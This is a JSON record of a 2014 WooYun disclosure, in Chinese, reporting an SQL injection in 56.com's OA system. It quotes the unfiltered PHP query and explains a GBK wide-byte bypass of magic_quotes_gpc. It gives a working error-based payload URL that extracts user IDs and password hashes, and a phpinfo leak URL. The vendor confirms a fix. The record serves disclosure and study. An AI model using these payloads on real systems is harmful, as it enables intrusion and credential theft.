{"id": 3660, "wybug_id": "wooyun-2014-061297", "wybug_title": "56网OA系统SQL注入", "wybug_corp": "56.com", "wybug_author": "cmd", "wybug_date": "2014-05-18 16:10", "wybug_open_date": "2014-06-11 14:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-11：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 56网OA系统SQL注入 详细说明：  http://oa.corp.56.com是OA系统ispirit/check_secure_key.php没有过滤USERNAME参数，导致了SQL注入漏洞$USERNAME = $_GET['USERNAME'];$query = \"SELECT SECURE_KEY_SN from USER where USER_ID='\".$USERNAME.\"'\";$cursor = exequery( TD::conn( ), $query );虽然开启了magic_quotes_gpc，但是可以用GBK宽字节注入。   漏洞证明：  http://oa.corp.56.com/ispirit/check_secure_key.php?USERNAME=%df%27and(select%201%20from%20(select%20count(*),concat((select%20concat(user_id,0x3b,password)%20from%20user%20order%20by%20uid%20limit%201,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23\n\n暴用户密码hash\n\n再送一个phpinfo信息泄漏http://oa.corp.56.com/inc/php.php?MYOA_PASSWORD=qiqiphp\n\n   修复方案：  过滤   版权声明：转载请注明来源 cmd@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-05-18 16:58 厂商回复： OA系统应该是限制只有内网访问的, 因为运维漏了配置才暴露出来的.   感谢报告! 已经通知运维修改设置. 最新状态： 2014-06-11：已修复。  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}